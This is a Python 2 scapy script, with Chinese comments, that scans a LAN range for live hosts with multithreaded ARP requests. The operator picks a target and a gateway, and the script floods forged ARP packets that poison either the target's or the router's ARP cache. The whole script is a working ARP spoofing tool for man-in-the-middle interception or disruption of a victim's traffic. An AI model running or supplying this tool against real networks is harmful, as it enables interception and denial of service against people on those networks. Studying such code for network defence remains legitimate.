#!/usr/bin/python
#coding:utf-8
from scapy.all import *
import re
import threading
#主机存活扫描
def loop(i):
    adderss_list=[]#纯单个存活的ip及mac的列表
    Pdst=ip_start[0][0]+str(int(ip_start[0][1])+i)#拼装成要探测的目标ip地址
    arp=Ether(src=Hwsrc,dst=Dst,type=0x806)/ARP(op=1,hwdst=Hwdst,pdst=Pdst,hwsrc=Hwsrc,psrc=Psrc)
    pk=srp(arp,timeout=2,iface=Iface,verbose=False)#探测数据包
    try:
        adderss_list.append(pk[0].res[0][1].getlayer(ARP).fields['psrc'])#获取ip
        adderss_list.append(pk[0].res[0][1].getlayer(ARP).fields['hwsrc'])#获取mac
        List.append(adderss_list)#把存活的主机放入列表中
        Len=len(List)#获取列表长度用于排序
    except IndexError:
        pass
    else:
        print '%s==>ip-->%s\tmac-->%s'%(Len,adderss_list[0],adderss_list[1])
#开启多线程进行扫描
def mul_pro():
	loops=int(ip_end[0][1])-int(ip_start[0][1])+1#计算开启的线程数
	threads=[]
	for i in range(loops):
	    t=threading.Thread(target=loop,args=(i,))
	    threads.append(t)
	for i in range(loops):
	    threads[i].start()
	for i in range(loops):
	    threads[i].join()    
#欺骗目标机数据包（1）
def arp(Dst,Op,Pdst,gateway):
    arp=Ether(src=Hwsrc,dst=Dst,type=0x806)/ARP(op=Op,hwdst=Dst,pdst=Pdst,hwsrc=Hwsrc,psrc=gateway)
    return arp
#欺骗路由器数据包（2）
def arp_router(gateway,Op,target_ip):
    gateway_mac=raw_input('网关_mac-->')
    arp=Ether(src=Hwsrc,dst=gateway_mac,type=0x806)/ARP(op=Op,hwdst=gateway_mac,pdst=gateway,hwsrc=Hwsrc,psrc=target_ip)
    return arp
#发送arp包
def sendto(arp):
    while True:
        pk=srp(arp,timeout=2,iface=Iface,verbose=False)
def main():
    mul_pro()#主机存活扫描
    number=input('攻击第n个ip-->')
    gateway=raw_input('网关ip-->')
    way=input('欺骗目标机（1）欺骗路由器（2）-->')
    Op=input('请求攻击（1）回复攻击（2）-->')
    data=(arp(List[number-1][1],Op,List[number-1][0],gateway) if way==1 else arp_router(gateway,Op,List[number-1][0]))#构造数据包
    sendto(data)#发送arp包进行欺骗
if __name__=='__main__':
#全局变量
    Iface=raw_input('网卡-->')
    Psrc=raw_input('源ip-->')
    Hwsrc=raw_input('源mac-->')
    ip__start=raw_input('ip__start-->')
    ip__end=raw_input('ip__end-->')
    ip_start=re.findall(r'(\d+\.\d+\.\d+\.)(\d+)',ip__start)
    ip_end=re.findall(r'(\d+\.\d+\.\d+\.)(\d+)',ip__end)
    Dst='ff:ff:ff:ff:ff:ff'
    Hwdst='00:00:00:00:00:00'
    List=[]#保存所有存活的主机ip及mac
#strart
    main()
       